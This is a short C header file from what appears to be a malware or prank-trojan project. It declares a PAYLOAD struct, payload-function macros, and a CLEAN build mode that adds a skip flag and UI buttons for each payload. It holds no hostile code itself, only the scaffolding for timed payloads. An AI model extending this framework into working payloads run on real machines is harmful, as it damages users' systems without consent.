#pragma once
#include "Elon.h"

typedef struct {
#ifdef CLEAN
	int(*payloadFunction)(int, int, BOOLEAN);
	wchar_t *name;
	HWND btn;
	int delay, times, runtime, delaytime;
	BOOLEAN safe;
#else
	int(*payloadFunction)(int, int);
	int delay;
#endif
} PAYLOAD;

#ifdef CLEAN
#define PAYLOADFUNC int times, int runtime, BOOLEAN skip
#define PAYLOADHEAD if (skip) goto out;
#else
#define PAYLOADFUNC int times, int runtime
#define PAYLOADHEAD
#endif

extern PAYLOAD payloads[];
extern const size_t nPayloads;
